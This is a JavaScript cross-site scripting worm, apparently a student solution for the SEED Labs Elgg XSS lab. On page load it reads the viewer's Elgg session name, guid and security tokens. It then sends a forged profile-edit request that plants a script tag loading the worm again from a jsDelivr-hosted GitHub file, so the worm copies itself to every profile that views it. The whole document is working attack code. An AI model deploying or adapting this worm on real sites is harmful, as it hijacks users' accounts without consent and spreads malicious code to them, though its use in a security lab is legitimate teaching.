<script type="text/javascript">
window.onload = function(){
console.log("0");
	//JavaScript Code to access username, user guid, Time Stamp __elgg_ts
	// and Security Token __elgg_token
	var userName="&name="+elgg.session.user.name;
	var guid="&guid="+elgg.session.user.guid;
  	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	console.log("1");
	//Construct the content of your url.
	var description = "&description= \<script type=\"text\/javascript\" src=\"http:\/\/cdn.jsdelivr.net\/gh\/alegomonkey\/COS430_GA3_T6@V9\/xss_worm.js\"\>\<\/script\>" + "&accesslevel[description]=2";
	console.log("2");
	var content = ts + token + userName + description + guid;
	var samyGuid = 59;
	var sendurl = "http://www.seed-server.com/action/profile/edit";
	
	if(elgg.session.user.guid != samyGuid)
	{
		// Create and send Ajax request to modify projile
		var Ajax = null;
		Ajax = new XMLHttpRequest();
		Ajax.open("POST", sendurl, true);
		Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		Ajax.send(content);
	}
		console.log("3");
}
</script>




